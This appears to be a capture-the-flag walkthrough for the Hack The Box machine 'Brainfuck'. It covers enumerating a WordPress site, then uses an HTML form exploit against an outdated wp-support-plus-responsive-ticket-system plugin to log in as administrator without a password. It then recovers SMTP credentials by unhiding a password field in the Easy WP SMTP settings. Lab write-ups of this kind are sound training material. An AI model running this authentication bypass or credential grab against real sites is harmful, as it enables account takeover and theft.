# 10 - Brainfuck

# Web Server

![](vx_images/5462397826319.png)


# Certificate review (DNS and Email Records)

![](vx_images/1774113268796.png)


# Brainfuck.htb

![](vx_images/3363908615411.png)


# Super Secret Forum

![](vx_images/1952032941162.png)


# Wordpress


![](vx_images/5795105889566.png)


# Wordpress is running an older version of wp-support-plus-responsive-ticket-system and there is an exploit on exploit-db. See [05 - Enumeration.md](05%20-%20Enumeration.md) for the wpscan output

![](vx_images/4423908546209.png)


# Exploit
```html
<form method="post" action="http://wp/wp-admin/admin-ajax.php">
        Username: <input type="text" name="username" value="administrator">
        <input type="hidden" name="email" value="sth">
        <input type="hidden" name="action" value="loginGuestFacebook">
        <input type="submit" value="Login">
</form>
```


![](vx_images/3030523092687.png)

After a while this empty page is loaded 

![](vx_images/1100272907031.png)



Let's go to the index page now

![](vx_images/1203132871357.png)


On the top of the page we can see the admin bar, we are in fact logged in without providing any password


# SMTP integration

On the index page it has a post about SMTP integration, and because of that integration we can obtain the credentials from **Settings** -> **Easy WP SMTP**

![](vx_images/385247492897.png)

Let's unhide the password by changing the **input type** from password to username or we can just grab the value while we are at it

![](vx_images/5435062618733.png)